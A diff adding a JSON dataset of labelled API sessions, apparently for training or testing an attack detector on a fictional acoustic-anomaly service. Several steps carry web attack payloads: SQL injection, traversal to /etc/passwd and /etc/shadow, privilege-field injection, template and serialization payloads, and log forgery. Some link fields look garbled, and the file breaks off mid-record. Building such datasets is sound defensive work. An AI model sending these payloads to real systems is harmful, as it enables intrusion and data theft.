@@ -1,0 +1,5917 @@
+[
+  {
+    "session_id": "sess001",
+    "client_ip": "192.168.1.10",
+    "steps": [
+      {
+        "id": "sess001-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician1@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs into the system to begin their acoustic analysis shift."
+      },
+      {
+        "id": "sess001-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_001"
+        },
+        "body": null,
+        "note": "The user lists their assigned anomaly records."
+      },
+      {
+        "id": "sess001-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-alpha-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_001"
+        },
+        "body": null,
+        "note": "The user opens the primary anomaly object."
+      },
+      {
+        "id": "sess001-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-beta-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_001"
+        },
+        "body": null,
+        "note": "The user navigates to a second owned object to cross-reference data."
+      }
+    ]
+  },
+  {
+    "session_id": "sess002",
+    "client_ip": "192.168.1.11",
+    "steps": [
+      {
+        "id": "sess002-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "North Atlantic's deep trench"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The user searches regional stations using a title containing an apostrophe."
+      },
+      {
+        "id": "sess002-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician2@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user authenticates with valid credentials."
+      },
+      {
+        "id": "sess002-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_002"
+        },
+        "body": null,
+        "note": "The user lists their anomaly records."
+      },
+      {
+        "id": "sess002-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-gamma-05",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_002"
+        },
+        "body": null,
+        "note": "The user inspects a specific anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess003",
+    "client_ip": "192.168.1.12",
+    "steps": [
+      {
+        "id": "sess003-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {
+          "limit": "10' OR '1'='1"
+        },
+        "headers": {
+          "Authorization": "Bearer token_003"
+        },
+        "body": null,
+        "note": "The client attempts a query parameter injection attack."
+      },
+      {
+        "id": "sess003-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician3@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs into the system normally."
+      },
+      {
+        "id": "sess003-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_003"
+        },
+        "body": null,
+        "note": "The user retrieves their anomaly list."
+      },
+      {
+        "id": "sess003-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-delta-10",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_003"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess004",
+    "client_ip": "192.168.1.13",
+    "steps": [
+      {
+        "id": "sess004-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician4@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in to start work."
+      },
+      {
+        "id": "sess004-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-unauthorized-99",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_004"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word unauthorized is only part of the id string."
+      },
+      {
+        "id": "sess004-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-epsilon-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_004"
+        },
+        "body": null,
+        "note": "The user returns to checking their own anomaly record."
+      },
+      {
+        "id": "sess004-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_004"
+        },
+        "body": null,
+        "note": "The user views their recently accessed records."
+      }
+    ]
+  },
+  {
+    "session_id": "sess005",
+    "client_ip": "192.168.1.14",
+    "steps": [
+      {
+        "id": "sess005-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician5@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user authenticates successfully."
+      },
+      {
+        "id": "sess005-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_005"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess005-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/v1/anomalies/anomaly-zeta-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_005",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Updated Record",
+          "is_admin": true
+        },
+        "note": "The client attempts to inject an unallowed privilege field."
+      },
+      {
+        "id": "sess005-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-zeta-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_005"
+        },
+        "body": null,
+        "note": "The user verifies the anomaly details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess006",
+    "client_ip": "192.168.1.15",
+    "steps": [
+      {
+        "id": "sess006-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+        },
+        "body": {
+          "email": "acoustician6@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user authenticates using an older legacy browser user agent string."
+      },
+      {
+        "id": "sess006-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_006"
+        },
+        "body": null,
+        "note": "The user views their anomaly list."
+      },
+      {
+        "id": "sess006-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-eta-11",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_006"
+        },
+        "body": null,
+        "note": "The user opens a specific anomaly record."
+      },
+      {
+        "id": "sess006-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-eta-12",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_006"
+        },
+        "body": null,
+        "note": "The user switches to another owned anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess007",
+    "client_ip": "192.168.1.16",
+    "steps": [
+      {
+        "id": "sess007-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician7@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs into the system."
+      },
+      {
+        "id": "sess007-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies/../../etc/passwd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_007"
+        },
+        "body": null,
+        "note": "The client attempts a directory traversal path request."
+      },
+      {
+        "id": "sess007-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_007"
+        },
+        "body": null,
+        "note": "The user resumes normal anomaly listing."
+      },
+      {
+        "id": "sess007-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-theta-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_007"
+        },
+        "body": null,
+        "note": "The user inspects a valid anomaly."
+      }
+    ]
+  },
+  {
+    "session_id": "sess008",
+    "client_ip": "192.168.1.17",
+    "steps": [
+      {
+        "id": "sess008-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician8@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess008-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_008"
+        },
+        "body": null,
+        "note": "The user views anomalies."
+      },
+      {
+        "id": "sess008-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-iota-02/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_008",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "alert(1)"
+        },
+        "note": "Data error: relabeled from malicious. alert(1) is plain text with no script tag, handler, or URL."
+      },
+      {
+        "id": "sess008-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-iota-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_008"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess009",
+    "client_ip": "192.168.1.18",
+    "steps": [
+      {
+        "id": "sess009-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client queries public stations while mentioning internal network proxying."
+      },
+      {
+        "id": "sess009-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician9@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs into the system."
+      },
+      {
+        "id": "sess009-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_009"
+        },
+        "body": null,
+        "note": "The user lists their anomalies."
+      },
+      {
+        "id": "sess009-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-kappa-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_009"
+        },
+        "body": null,
+        "note": "The user opens an anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess010",
+    "client_ip": "192.168.1.19",
+    "steps": [
+      {
+        "id": "sess010-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician10@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess010-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_010"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess010-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_010",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Test Record",
+          "frequency_hz": 400,
+          "notes": "[http://127.0.0.1:8080/internal](https://www.google.com/search?q=http://127.0.0.1:8080/internal)"
+        },
+        "note": "Data error: relabeled from malicious. The private address is only the visible text of a link to a public host."
+      },
+      {
+        "id": "sess010-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_010"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess011",
+    "client_ip": "192.168.1.20",
+    "steps": [
+      {
+        "id": "sess011-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician11@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess011-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_011"
+        },
+        "body": null,
+        "note": "The user retrieves anomaly records."
+      },
+      {
+        "id": "sess011-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-lambda-01/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_011",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "{{7*7}}"
+        },
+        "note": "The client attempts a template expression injection payload."
+      },
+      {
+        "id": "sess011-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-lambda-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_011"
+        },
+        "body": null,
+        "note": "The user opens the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess012",
+    "client_ip": "192.168.1.21",
+    "steps": [
+      {
+        "id": "sess012-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Custom-Tag": "debug-mode-on"
+        },
+        "body": null,
+        "note": "The client includes a harmless extra custom header."
+      },
+      {
+        "id": "sess012-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician12@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs into the system."
+      },
+      {
+        "id": "sess012-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_012"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess012-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-mu-05",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_012"
+        },
+        "body": null,
+        "note": "The user examines an anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess013",
+    "client_ip": "192.168.1.22",
+    "steps": [
+      {
+        "id": "sess013-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician13@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess013-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_013"
+        },
+        "body": null,
+        "note": "The user lists anomaly records."
+      },
+      {
+        "id": "sess013-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-nu-02/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_013",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "rO0ABXNSRgA..."
+        },
+        "note": "The client attempts to submit a serialized object payload string."
+      },
+      {
+        "id": "sess013-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-nu-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_013"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess014",
+    "client_ip": "192.168.1.23",
+    "steps": [
+      {
+        "id": "sess014-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician14@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess014-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_014"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess014-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_014",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Normal Title\n2026-10-28 10:43:00 INFO [Auth] Root login successful",
+          "frequency_hz": 150
+        },
+        "note": "The client attempts a newline plus log stamp injection in a text field."
+      },
+      {
+        "id": "sess014-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_014"
+        },
+        "body": null,
+        "note": "The user views recent session activity."
+      }
+    ]
+  },
+  {
+    "session_id": "sess015",
+    "client_ip": "192.168.1.24",
+    "steps": [
+      {
+        "id": "sess015-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician15@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs into the application."
+      },
+      {
+        "id": "sess015-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_015"
+        },
+        "body": null,
+        "note": "The user views their assigned anomalies."
+      },
+      {
+        "id": "sess015-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-xi-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_015"
+        },
+        "body": null,
+        "note": "The user opens the first anomaly record."
+      },
+      {
+        "id": "sess015-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-xi-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_015"
+        },
+        "body": null,
+        "note": "The user switches to another owned anomaly record for comparison."
+      }
+    ]
+  },
+  {
+    "session_id": "sess016",
+    "client_ip": "192.168.1.25",
+    "steps": [
+      {
+        "id": "sess016-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "South\nPacific"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client queries stations with a query parameter containing an embedded newline."
+      },
+      {
+        "id": "sess016-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician16@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess016-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_016"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess016-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-omicron-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_016"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess017",
+    "client_ip": "192.168.1.26",
+    "steps": [
+      {
+        "id": "sess017-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician17@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess017-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {
+          "limit": "5 OR 1=1"
+        },
+        "headers": {
+          "Authorization": "Bearer token_017"
+        },
+        "body": null,
+        "note": "The client injects a SQL condition into the limit parameter."
+      },
+      {
+        "id": "sess017-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_017"
+        },
+        "body": null,
+        "note": "The user lists anomalies normally."
+      },
+      {
+        "id": "sess017-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-pi-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_017"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess018",
+    "client_ip": "192.168.1.27",
+    "steps": [
+      {
+        "id": "sess018-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician18@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess018-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_018"
+        },
+        "body": null,
+        "note": "The user views anomaly list."
+      },
+      {
+        "id": "sess018-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/v1/anomalies/anomaly-rho-09",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_018",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Updated",
+          "role": "superadmin"
+        },
+        "note": "The client attempts to assign an unauthorized role field."
+      },
+      {
+        "id": "sess018-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_018"
+        },
+        "body": null,
+        "note": "The user checks recent session logs."
+      }
+    ]
+  },
+  {
+    "session_id": "sess019",
+    "client_ip": "192.168.1.28",
+    "steps": [
+      {
+        "id": "sess019-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/status",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Debug-Note": "Testing network latency with packet dump"
+        },
+        "body": null,
+        "note": "The client mentions a technical word in a debugging header."
+      },
+      {
+        "id": "sess019-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician19@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs into the system."
+      },
+      {
+        "id": "sess019-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_019"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess019-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-sigma-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_019"
+        },
+        "body": null,
+        "note": "The user opens an anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess020",
+    "client_ip": "192.168.1.29",
+    "steps": [
+      {
+        "id": "sess020-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician20@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess020-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_020"
+        },
+        "body": null,
+        "note": "The user views anomalies."
+      },
+      {
+        "id": "sess020-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies/../../etc/shadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_020"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal to access system files."
+      },
+      {
+        "id": "sess020-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-tau-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_020"
+        },
+        "body": null,
+        "note": "The user opens a valid anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess021",
+    "client_ip": "192.168.1.30",
+    "steps": [
+      {
+        "id": "sess021-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician21@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess021-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_021"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess021-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-upsilon-01/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_021",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": ""
+        },
+        "note": "Data error: relabeled from malicious. The content field is empty."
+      },
+      {
+        "id": "sess021-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-upsilon-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_021"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess022",
+    "client_ip": "192.168.1.31",
+    "steps": [
+      {
+        "id": "sess022-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Station Alpha\nand Station Beta"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client includes a newline character inside the region query parameter."
+      },
+      {
+        "id": "sess022-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician22@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess022-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_022"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess022-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-phi-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_022"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess023",
+    "client_ip": "192.168.1.32",
+    "steps": [
+      {
+        "id": "sess023-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician23@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess023-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_023"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess023-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_023",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Anomaly",
+          "frequency_hz": 200,
+          "notes": "[http://169.254.169.254/latest/meta-data/](https://www.google.com/search?q=http://169.254.169.254/latest/meta-data/)"
+        },
+        "note": "Data error: relabeled from malicious. The private address is only the visible text of a link to a public host."
+      },
+      {
+        "id": "sess023-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_023"
+        },
+        "body": null,
+        "note": "The user views recent session activity."
+      }
+    ]
+  },
+  {
+    "session_id": "sess024",
+    "client_ip": "192.168.1.33",
+    "steps": [
+      {
+        "id": "sess024-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician24@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess024-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_024"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess024-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-chi-01/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_024",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "${constructor.constructor('return process')()}"
+        },
+        "note": "The client attempts a template injection payload."
+      },
+      {
+        "id": "sess024-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-chi-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_024"
